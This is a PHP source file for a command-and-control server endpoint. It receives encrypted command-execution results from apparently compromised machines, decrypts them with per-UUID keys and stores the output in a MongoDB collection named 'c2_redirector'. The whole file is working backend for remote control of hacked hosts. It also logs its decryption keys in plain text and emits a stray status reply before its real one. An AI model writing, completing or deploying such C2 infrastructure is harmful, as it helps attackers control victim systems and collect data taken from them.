<?php
// output.php
// C2 endpoint to receive command execution results
error_reporting(E_ALL);
ini_set('display_errors', 1);

$envFile = __DIR__ . '/.env';
if (file_exists($envFile)) {
    $lines = file($envFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    foreach ($lines as $line) {
        if (strpos(trim($line), '#') === 0 || strpos(trim($line), 'export ') !== 0) {
            continue;
        }
        
        // Remove 'export ' prefix and split
        $line = substr(trim($line), 7);
        list($name, $value) = explode('=', $line, 2);
        $name = trim($name);
        $value = trim($value);
        
        // Remove quotes
        $value = trim($value, '"\'');
        
        if (!array_key_exists($name, $_ENV)) {
            $_ENV[$name] = $value;
            putenv("$name=$value");
        }
    }
}

header('Content-Type: application/json');

// Log every request
error_log("Output.php called with method: " . $_SERVER['REQUEST_METHOD']);
error_log("Input: " . file_get_contents('php://input'));

echo json_encode(['status' => 'ok', 'message' => 'output.php is working']);

try {
    include_once __DIR__ . '/AES.php';
} catch (Exception $e) {
    http_response_code(500);
    die(json_encode(['error' => $e->getMessage()]));
}

// Check if MongoDB driver is available
if (!class_exists('MongoDB\Driver\Manager')) {
    http_response_code(500);
    echo json_encode(["error" => "MongoDB Driver not available"]);
    exit;
}

// Get input data
if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $input = json_decode(file_get_contents('php://input'), true) ?? $_POST;
} else {
    http_response_code(405);
    echo json_encode(["error" => "Method not allowed"]);
    exit;
}

// Validate required fields
$uuid = $input['uuid'] ?? '';
$encrypted_data = $input['encrypted_data'] ?? '';

if (empty($uuid) || empty($encrypted_data)) {
    http_response_code(400);
    echo json_encode(["error" => "UUID and encrypted_data are required"]);
    exit;
}

try {
    error_log("Retrieving decryption key for UUID: $uuid");
    // Get decryption key from database
    $keys = AES256Decryptor::getEncryptionandDecryptionKeysByUUID($uuid);
    
    error_log("Keys: " . json_encode($keys));

    if (!$keys['success']) {
        http_response_code(404);
        echo json_encode(["error" => $keys['error']]);
        exit;
    }

    error_log("Decryption key: " . $keys['decryption_key']);
    
    $decryptionKeyBase64 = $keys['decryption_key'];
    $decryptionKey = base64_decode($decryptionKeyBase64);

    if (empty($decryptionKey)) {
        http_response_code(400);
        echo json_encode(["error" => "No decryption key available for this UUID"]);
        exit;
    }

    error_log("Decryption key: " . $decryptionKey);


    error_log("Encrypted data: " . $encrypted_data);
    
    // Create decryptor instance and decrypt
    $decryptor = new AES256Decryptor($decryptionKey);
    $decrypted_json = $decryptor->decrypt($encrypted_data);
    
    if (empty($decrypted_json)) {
        http_response_code(400);
        echo json_encode(["error" => "Failed to decrypt data"]);
        exit;
    }
    
    error_log("Decrypted JSON: " . $decrypted_json);

    // Parse decrypted JSON
    $decrypted_data = json_decode($decrypted_json, true);
    if ($decrypted_data === null) {
        http_response_code(400);
        echo json_encode(["error" => "Decrypted data is not valid JSON"]);
        exit;
    }
    
    $command = $decrypted_data['command'] ?? '';
    $output = $decrypted_data['output'] ?? '';
    $status = $decrypted_data['status'] ?? 'executed';
    $exit_code = $decrypted_data['exit_code'] ?? 0;

    if (empty($command)) {
        http_response_code(400);
        echo json_encode(["error" => "Command is required in decrypted data"]);
        exit;
    }

    // Connect to MongoDB
    $mongoUri = getenv('MONGO_URI');
    if (empty($mongoUri)) {
        http_response_code(500);
        echo json_encode(["error" => "MongoDB URI not configured"]);
        exit;
    }
    
    // error_log("MongoDB URI: " . $mongoUri);

    $manager = new MongoDB\Driver\Manager($mongoUri, ['connectTimeoutMS' => 5000]);
    
    // Update the command document with output and status
    $bulk = new MongoDB\Driver\BulkWrite;
    $bulk->update(
        [
            'uuid' => $uuid,
            'command' => $command,
            'status' => 'sent'
        ],
        ['$set' => [
            'output' => $output,
            'status' => $status,
            'exit_code' => (int)$exit_code,
            'executed_at' => new MongoDB\BSON\UTCDateTime(),
            'updated_at' => new MongoDB\BSON\UTCDateTime()
        ]],
        ['multi' => false]
    );
    
    $result = $manager->executeBulkWrite('c2_redirector.commands', $bulk);
    
    if ($result->getModifiedCount() > 0) {
        echo json_encode([
            "success" => true,
            "message" => "Output stored successfully",
            "modified_count" => $result->getModifiedCount()
        ]);
    } else {
        // Try to find if the command exists but with different status
        $filter = ['uuid' => $uuid, 'command' => $command];
        $query = new MongoDB\Driver\Query($filter);
        $cursor = $manager->executeQuery('c2_redirector.commands', $query);
        $documents = $cursor->toArray();
        
        if (empty($documents)) {
            http_response_code(404);
            echo json_encode(["error" => "No command found for this UUID and command"]);
        } else {
            // Update anyway if command exists but status is not 'sent'
            $bulk = new MongoDB\Driver\BulkWrite;
            $bulk->update(
                ['uuid' => $uuid, 'command' => $command],
                ['$set' => [
                    'output' => $output,
                    'status' => $status,
                    'exit_code' => (int)$exit_code,
                    'executed_at' => new MongoDB\BSON\UTCDateTime(),
                    'updated_at' => new MongoDB\BSON\UTCDateTime()
                ]]
            );
            
            $result = $manager->executeBulkWrite('c2_redirector.commands', $bulk);
            echo json_encode([
                "success" => true,
                "message" => "Output stored successfully (status updated)",
                "modified_count" => $result->getModifiedCount()
            ]);
        }
    }

} catch (Exception $e) {
    http_response_code(500);
    echo json_encode(["error" => "Error: " . $e->getMessage()]);
    exit;
}
?>